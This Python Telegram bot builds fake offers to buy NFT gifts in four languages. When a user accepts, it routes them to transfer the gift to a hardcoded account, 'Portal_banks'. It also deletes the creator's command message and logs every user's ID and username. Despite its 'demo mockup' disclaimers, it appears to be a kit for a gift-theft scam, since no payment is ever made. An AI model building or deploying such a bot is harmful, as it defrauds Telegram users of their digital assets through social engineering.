
import os
import asyncio
import sqlite3
import html
import uuid
from decimal import Decimal, InvalidOperation
from urllib.parse import urlparse

from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    CallbackQuery,
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BotCommand,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramAPIError


# =========================
# SETTINGS
# =========================

BOT_TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.getenv("PORT", "10000"))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")
DB_PATH = os.getenv("DB_PATH", "users.db")

TRANSFER_USERNAME = "Portal_banks"

if not BOT_TOKEN:
    raise RuntimeError("Не задан BOT_TOKEN")

if not RENDER_URL:
    raise RuntimeError("Не найден RENDER_EXTERNAL_URL")

WEBHOOK_URL = f"{RENDER_URL}/webhook"

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()
offers = {}


# =========================
# DATABASE
# =========================

db = sqlite3.connect(DB_PATH)
db.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    access INTEGER DEFAULT 1
)
""")
db.commit()


def save_user(user_id, username):
    username = username.lower() if username else None
    db.execute("""
        INSERT INTO users (user_id, username, access)
        VALUES (?, ?, 1)
        ON CONFLICT(user_id)
        DO UPDATE SET username = excluded.username
    """, (user_id, username))
    db.commit()


# =========================
# TRANSLATIONS
# =========================

TEXTS = {
    "ru": {
        "welcome": "👋 <b>Добро пожаловать!</b>\n\n"
                   "✅ Доступ к демонстрационному боту открыт!\n\n"
                   "Пример:\n"
                   "<code>.buy https://t.me/nft/123 1700 stars ru</code>",
        "bad_format": "❌ Неверный формат.\n\n"
                      "<code>.buy ссылка цена stars/gram ru/en/ch/ar</code>",
        "bad_currency": "❌ Валюта должна быть stars или gram.",
        "bad_language": "❌ Язык должен быть ru, en, ch или ar.",
        "bad_price": "❌ Цена должна быть положительным числом.",
        "bad_link": "❌ Укажите корректную ссылку http или https.",
        "title": "🎁 <b>Демонстрационное предложение</b>",
        "gift": "🎁 Подарок",
        "price": "💰 Цена",
        "expires": "Действует 24 часа",
        "show": "🎁 Показать подарок",
        "accept": "✅ Принять",
        "decline": "❌ Отклонить",
        "demo": "⚠️ <i>Демонстрационный макет. "
                "Реальная сделка и передача подарка не выполняются.</i>",
        "accepted": "✅ <b>Предложение принято!</b>",
        "instructions": "📩 <b>Инструкция</b>\n\n"
                        "1. Ознакомьтесь с условиями сделки.\n"
                        "2. Нажмите кнопку ниже, чтобы открыть профиль.\n"
                        "3. Дальнейшие действия выполняйте вручную "
                        "и только после проверки получателя.\n\n",
        "transfer": "🎁 Передать подарок",
        "declined": "❌ Предложение отклонено.",
        "unavailable": "Предложение недоступно.",
    },
    "en": {
        "welcome": "👋 <b>Welcome!</b>\n\n"
                   "✅ Demo bot access is open!\n\n"
                   "Example:\n"
                   "<code>.buy https://t.me/nft/123 1700 stars en</code>",
        "bad_format": "❌ Invalid format.\n\n"
                      "<code>.buy link price stars/gram ru/en/ch/ar</code>",
        "bad_currency": "❌ Currency must be stars or gram.",
        "bad_language": "❌ Language must be ru, en, ch, or ar.",
        "bad_price": "❌ Price must be a positive number.",
        "bad_link": "❌ Enter a valid http or https link.",
        "title": "🎁 <b>Demonstration offer</b>",
        "gift": "🎁 Gift",
        "price": "💰 Price",
        "expires": "Expires in 24 hours",
        "show": "🎁 Show gift",
        "accept": "✅ Accept",
        "decline": "❌ Decline",
        "demo": "⚠️ <i>Demo mockup. No real transaction "
                "or gift transfer takes place.</i>",
        "accepted": "✅ <b>Offer accepted!</b>",
        "instructions": "📩 <b>Instructions</b>\n\n"
                        "1. Review the terms.\n"
                        "2. Use the button below to open the profile.\n"
                        "3. Continue manually and verify the recipient first.\n\n",
        "transfer": "🎁 Transfer gift",
        "declined": "❌ Offer declined.",
        "unavailable": "Offer unavailable.",
    },
    "ch": {
        "welcome": "👋 <b>欢迎！</b>\n\n"
                   "✅ 演示机器人已开放使用！\n\n"
                   "示例：\n"
                   "<code>.buy https://t.me/nft/123 1700 stars ch</code>",
        "bad_format": "❌ 格式错误。\n\n"
                      "<code>.buy 链接 价格 stars/gram ru/en/ch/ar</code>",
        "bad_currency": "❌ 货币必须是 stars 或 gram。",
        "bad_language": "❌ 语言必须是 ru、en、ch 或 ar。",
        "bad_price": "❌ 价格必须大于零。",
        "bad_link": "❌ 请输入有效的 http 或 https 链接。",
        "title": "🎁 <b>演示报价</b>",
        "gift": "🎁 礼物",
        "price": "💰 价格",
        "expires": "有效期为 24 小时",
        "show": "🎁 查看礼物",
        "accept": "✅ 接受",
        "decline": "❌ 拒绝",
        "demo": "⚠️ <i>演示界面，不会执行真实交易或礼物转移。</i>",
        "accepted": "✅ <b>已接受报价！</b>",
        "instructions": "📩 <b>操作说明</b>\n\n"
                        "1. 请先阅读交易条件。\n"
                        "2. 点击下方按钮打开个人资料。\n"
                        "3. 后续操作需手动完成，并先核实接收方。\n\n",
        "transfer": "🎁 转移礼物",
        "declined": "❌ 已拒绝报价。",
        "unavailable": "报价不可用。",
    },
    "ar": {
        "welcome": "👋 <b>مرحباً!</b>\n\n"
                   "✅ البوت التجريبي متاح الآن!\n\n"
                   "مثال:\n"
                   "<code>.buy https://t.me/nft/123 1700 stars ar</code>",
        "bad_format": "❌ تنسيق غير صحيح.\n\n"
                      "<code>.buy link price stars/gram ru/en/ch/ar</code>",
        "bad_currency": "❌ العملة يجب أن تكون stars أو gram.",
        "bad_language": "❌ اللغة يجب أن تكون ru أو en أو ch أو ar.",
        "bad_price": "❌ يجب أن يكون السعر رقماً موجباً.",
        "bad_link": "❌ أدخل رابط http أو https صالحاً.",
        "title": "🎁 <b>عرض تجريبي</b>",
        "gift": "🎁 الهدية",
        "price": "💰 السعر",
        "expires": "صالح لمدة 24 ساعة",
        "show": "🎁 عرض الهدية",
        "accept": "✅ قبول",
        "decline": "❌ رفض",
        "demo": "⚠️ <i>نموذج تجريبي. لا تتم أي معاملة "
                "حقيقية أو عملية نقل للهدية.</i>",
        "accepted": "✅ <b>تم قبول العرض!</b>",
        "instructions": "📩 <b>التعليمات</b>\n\n"
                        "1. راجع شروط العرض.\n"
                        "2. اضغط الزر أدناه لفتح الملف الشخصي.\n"
                        "3. أكمل أي خطوات يدوياً وتحقق من المستلم أولاً.\n\n",
        "transfer": "🎁 نقل الهدية",
        "declined": "❌ تم رفض العرض.",
        "unavailable": "العرض غير متاح.",
    },
}


# =========================
# KEYBOARDS
# =========================

def offer_keyboard(offer_id, lang, gift_link):
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=t["show"],
            url=gift_link,
        )],
        [
            InlineKeyboardButton(
                text=t["accept"],
                callback_data=f"accept:{offer_id}",
            ),
            InlineKeyboardButton(
                text=t["decline"],
                callback_data=f"decline:{offer_id}",
            ),
        ],
    ])


def transfer_keyboard(lang):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=TEXTS[lang]["transfer"],
            url=f"https://t.me/{TRANSFER_USERNAME}",
        )
    ]])


# =========================
# START
# =========================

@dp.message(F.text == "/start")
async def start(message: Message):
    user = message.from_user
    if user:
        save_user(user.id, user.username)

    await message.answer(TEXTS["ru"]["welcome"])


# =========================
# CREATE OFFER
# Format:
# .buy URL PRICE stars/gram ru/en/ch/ar
# =========================

@dp.message(F.text.startswith(".buy"))
async def create_offer(message: Message):
    user = message.from_user
    if user:
        save_user(user.id, user.username)

    parts = (message.text or "").split()

    if len(parts) != 5 or parts[0].lower() != ".buy":
        await message.answer(TEXTS["ru"]["bad_format"])
        return

    _, gift_link, raw_price, currency, lang = parts
    currency = currency.lower()
    lang = lang.lower()

    if lang not in TEXTS:
        await message.answer(TEXTS["ru"]["bad_language"])
        return

    t = TEXTS[lang]

    if currency not in ("stars", "gram"):
        await message.answer(t["bad_currency"])
        return

    try:
        price = Decimal(raw_price.replace(",", "."))
        if not price.is_finite() or price <= 0:
            raise InvalidOperation
    except (InvalidOperation, ValueError):
        await message.answer(t["bad_price"])
        return

    parsed = urlparse(gift_link)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        await message.answer(t["bad_link"])
        return

    price_text = format(price.normalize(), "f")
    currency_text = "⭐ Stars" if currency == "stars" else "💎 GRAM"
    safe_link = html.escape(gift_link, quote=True)

    offer_id = uuid.uuid4().hex[:10]
    offers[offer_id] = {
        "lang": lang,
        "price": price_text,
        "currency": currency,
        "gift_link": gift_link,
        "creator_id": user.id if user else None,
    }

    offer_text = (
        f'{t["title"]}\n\n'
        f'🎁 <a href="{safe_link}">{t["gift"]}</a>\n'
        f'{t["price"]}: <b>{html.escape(price_text)} '
        f'{currency_text}</b>\n\n'
        f'⏳ {t["expires"]}\n\n'
        f'{t["demo"]}'
    )

    await message.answer(
        offer_text,
        reply_markup=offer_keyboard(offer_id, lang, gift_link),
        disable_web_page_preview=False,
    )

    # Try removing the original command.
    # This depends on Telegram chat type and bot permissions.
    try:
        await message.delete()
    except TelegramAPIError:
        pass


# =========================
# ACCEPT
# =========================

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    offer = offers.get(offer_id)

    if not offer or not callback.message:
        await callback.answer(
            TEXTS["ru"]["unavailable"],
            show_alert=True,
        )
        return

    lang = offer["lang"]
    t = TEXTS[lang]

    await callback.message.edit_text(
        f'{t["accepted"]}\n\n'
        f'{t["instructions"]}'
        f'{t["demo"]}',
        reply_markup=transfer_keyboard(lang),
    )
    await callback.answer(t["accept"])


# =========================
# DECLINE
# =========================

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    offer_id = callback.data.split(":", 1)[1]
    offer = offers.pop(offer_id, None)

    if not callback.message:
        await callback.answer()
        return

    lang = offer["lang"] if offer else "ru"
    await callback.message.edit_text(TEXTS[lang]["declined"])
    await callback.answer(TEXTS[lang]["decline"])


# =========================
# REMEMBER USERS
# =========================

@dp.message()
async def remember_user(message: Message):
    user = message.from_user
    if user:
        save_user(user.id, user.username)


# =========================
# WEBHOOK
# =========================

async def health(request):
    return web.Response(text="Bot is running")


async def webhook(request):
    if WEBHOOK_SECRET:
        received = request.headers.get(
            "X-Telegram-Bot-Api-Secret-Token"
        )
        if received != WEBHOOK_SECRET:
            raise web.HTTPUnauthorized()

    data = await request.json()
    update = Update.model_validate(data, context={"bot": bot})
    await dp.feed_update(bot, update)
    return web.Response(text="OK")


# =========================
# RUN
# =========================

async def main():
    await bot.set_my_commands([
        BotCommand(command="start", description="Запустить бота"),
    ])

    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_post("/webhook", webhook)

    await bot.set_webhook(
        WEBHOOK_URL,
        secret_token=WEBHOOK_SECRET or None,
    )

    runner = web.AppRunner(app)
    await runner.setup()

    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()

    print("Bot started successfully!")
    print("Webhook is active!")

    try:
        await asyncio.Event().wait()
    finally:
        await bot.delete_webhook()
        await runner.cleanup()
        await bot.session.close()
        db.close()


if __name__ == "__main__":
    asyncio.run(main())
